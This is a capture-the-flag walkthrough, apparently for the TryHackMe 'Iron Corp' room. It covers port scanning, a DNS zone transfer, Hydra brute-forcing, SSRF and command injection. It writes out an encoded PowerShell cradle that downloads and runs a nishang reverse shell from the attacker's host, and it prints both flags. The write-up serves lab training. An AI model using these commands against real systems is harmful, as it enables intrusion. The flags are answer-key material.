> Iron Corp

# Nmap

nmap -sC -sV -A -Pn -p53,135,8080,3389,11025,49667,49670 -vv -oN nmap/initial ironcorp.me

```bash
53/tcp    open  domain        syn-ack Simple DNS Plus
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
8080/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
11025/tcp open  http          syn-ack Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The first one that caught my eye was port 8080 and port 11025. Nothing interesting in 8080. We got some saved creds. I tried the creds for RDP but failed!

Mail ID: mark@example.com
Creds: `jhonsanmark`:`11111122333`

In port 11025, nothing here too! So I moved onto DNS. I used Hacktricks as a reference and pentested DNS. And as given in the material I was trying for zone transfer and came across this.

```bash
dig axfr @10.10.71.28 ironcorp.me

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.71.28 ironcorp.me
; (1 server found)
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 192 msec
;; SERVER: 10.10.71.28#53(10.10.71.28)
;; WHEN: Thu Jul 01 06:20:21 EDT 2021
;; XFR size: 5 records (messages 1, bytes 238)
```

We got 2 subdomains. Ok let's see if we can access them. Nope! What?? So looks like they are only for internal services. So I tried to access `http://admin.ironcrop.me:11025` and we are prompted with web-authorization. Let's try to crack this! I guessed the username as admin.

# Hydra

hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt -s 11025 -f admin.ironcorp.me http-get

```bash
[11025][http-get] host: admin.ironcorp.me   login: admin   password: password123
```

Ok now we are in! And looks like this is an `Ulimate Search Bar`. Ok I tried some text and it is reflected in the URL.At this point I though of LFI but I can't do it how about local files or URL's like localhost. Then I remembered `internal.ironcorp.me:11025` was forbidden. So I tried to access it!

`http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2F#`. The file is still restricted but looking at the source code we can find `<b>You can find your name <a href=http://internal.ironcorp.me:11025/name.php?name=>here</a>`. OK! Now we can use this name.php and name parameter to display our name.

# Payload URL

`http://internal.ironcorp.me:11025/name.php?name=` -> `Equinox`
`http://internal.ironcorp.me:11025/name.php?name=n00bmast3r` 

```
<b>My name is: </b><pre>
	Equinoxn00bmast3r
```

OOh! Cool now let's see if we can inject code. `http://internal.ironcorp.me:11025/name.php?name=n00bmast3r|whoami`
and Yess! We have our output `nt authority\system`. Let's try to upload a nishang Invoke-PowershellTCP.ps1 shell.
I modified the file with last one line for the reverse call to my system.

`Invoke-PowerShellTcp -Reverse -IPAddress 10.9.12.130 -Port 1338`

powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.9.12.130:8000/Invoke-PowerShellTcp.ps1')

It didn't accept spaces? So how about URL encoding didn't work too! Looking at other writeups I double encoded the payload.

http://internal.ironcorp.me:11025/name.php?name=n00bmast3r|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%39%25%32%65%25%33%31%25%33%32%25%32%65%25%33%31%25%33%33%25%33%30%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39%25%30%39

And now I got a shell! Wow!

# user.txt

```
thm{09b408056a13fc222f33e6e4cf599f8c}
```

Even we are nt authority\system we can't view C:\SuperAdmin's contents. Probably the file name is `root.txt`.

type C:\Users\SuperAdmin\Desktop\root.txt

```
thm{a1f936a086b367761cc4e7dd6cd2e2bd}
```

# Reference

https://sckull.github.io/posts/ironcorp/
https://gitlab.com/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/Iron%20Corp/README.md